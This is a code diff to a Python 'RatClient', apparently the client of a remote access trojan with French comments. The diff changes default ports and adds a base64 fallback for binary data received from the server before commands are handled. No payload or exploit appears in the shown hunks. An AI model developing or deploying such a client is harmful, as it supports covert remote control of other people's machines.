@@ -37,7 +37,7 @@ if platform.system() != 'Windows':
     import termios
 
 class RatClient:
-    def __init__(self, server_host='127.0.0.1', server_port=8080):
+    def __init__(self, server_host='127.0.0.1', server_port=8081):
         self.server_host = server_host
         self.server_port = server_port
         self.socket = None
@@ -203,12 +203,21 @@ class RatClient:
                     print("Données incomplètes reçues")
                     break
                     
-                message = json.loads(data.decode())
+                try:
+                    # First try to decode as UTF-8 for text messages
+                    message = json.loads(data.decode('utf-8'))
+                except UnicodeDecodeError:
+                    # If UTF-8 fails, it's likely binary data - send as base64
+                    message = {
+                        'type': 'binary_data',
+                        'data': base64.b64encode(data).decode('utf-8')
+                    }
+                except json.JSONDecodeError as e:
+                    print(f"Erreur de décodage JSON : {e}")
+                    continue
+                    
                 self.handle_command(message)
                 
-            except json.JSONDecodeError as e:
-                print(f"Erreur de décodage JSON : {e}")
-                continue
             except Exception as e:
                 print(f"Erreur de réception : {e}")
                 break
@@ -1105,7 +1114,7 @@ def main():
     # Créer le parser d'arguments
     parser = argparse.ArgumentParser(description='Client RAT')
     parser.add_argument('--host', type=str, default='127.0.0.1', help='Adresse IP du serveur')
-    parser.add_argument('--port', type=int, default=3333, help='Port du serveur')
+    parser.add_argument('--port', type=int, default=8081, help='Port du serveur')
     
     # Parser les arguments
     args = parser.parse_args()
